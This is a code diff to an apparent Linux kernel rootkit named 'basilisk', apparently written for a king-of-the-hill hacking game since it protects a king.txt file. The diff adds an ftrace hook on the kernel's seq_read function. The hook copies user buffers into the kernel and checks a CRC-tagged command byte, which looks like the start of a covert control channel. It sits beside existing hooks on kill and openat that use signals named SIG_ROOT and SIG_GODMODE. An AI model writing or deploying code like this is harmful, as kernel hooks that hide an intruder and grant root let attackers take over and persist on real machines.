@@ -13,6 +13,8 @@
 #include <linux/namei.h>
 #include <linux/rwlock.h>
 
+#include "include/crc32.h"
+
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
 #include "include/utils.h"
@@ -22,6 +24,8 @@
 #define SIG_ROOT 64
 #define SIG_PROTECT 32
 #define SIG_GODMODE 38
+
+#define READ_PREFIX 0xfffffffa
 
 // Macros for protecting king.txt
 #define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
@@ -46,6 +50,54 @@ static struct file_operations *king_fops = NULL;
 
 // static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
+
+
+/*
+static const struct proc_ops kallsyms_proc_ops = {
+	.proc_open	= kallsyms_open,
+	.proc_read	= seq_read, <-- This is our target
+	.proc_lseek	= seq_lseek,
+	.proc_release	= seq_release_private,
+};
+*/
+static asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf, size_t size, loff_t *ppos);
+static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
+{
+    long error;
+    char *kbuf;
+    char cmd;
+    uint32_t extracted_crc, calculated_crc;
+    size_t crc_size = sizeof(uint32_t); // length of uint32_t
+    size_t data_size = 9;
+
+    kbuf = kmalloc(size, GFP_KERNEL);
+    if (!kbuf) {
+        return orig_seq_read(file, buf, size, ppos);
+    }
+
+    error = copy_from_user(kbuf, buf, size); // only need the first 9 bytes
+    if (error) {
+        pr_err(
+            "basilisk: failed to copy string from user space: error code %ld\n",
+            error
+        );
+        kfree(kbuf);
+        return orig_seq_read(file, buf, size, ppos);
+    }
+
+    cmd = kbuf[0]; // first byte (command)
+    extracted_crc = *(uint32_t *)(kbuf + data_size - crc_size);
+    calculated_crc = crc32(kbuf, data_size - crc_size);
+
+    if (calculated_crc != extracted_crc) {
+      kfree(kbuf);
+      return orig_seq_read(file, buf, size, ppos);
+    }
+    pr_info("basilisk: CRC matches: calculated 0x%x, extracted 0x%x\n", calculated_crc, extracted_crc);
+
+    kfree(kbuf);
+    return orig_seq_read(file, buf, size, ppos);
+}
 
 /*
 Hook for the read system call. Reads KING into buf and updates the pos pointer.
@@ -314,6 +366,7 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_openat", hook_openat, &orig_openat),
+    HOOK("seq_read", hook_seq_read, &orig_seq_read),
 };
 
 /* Module initialization function */
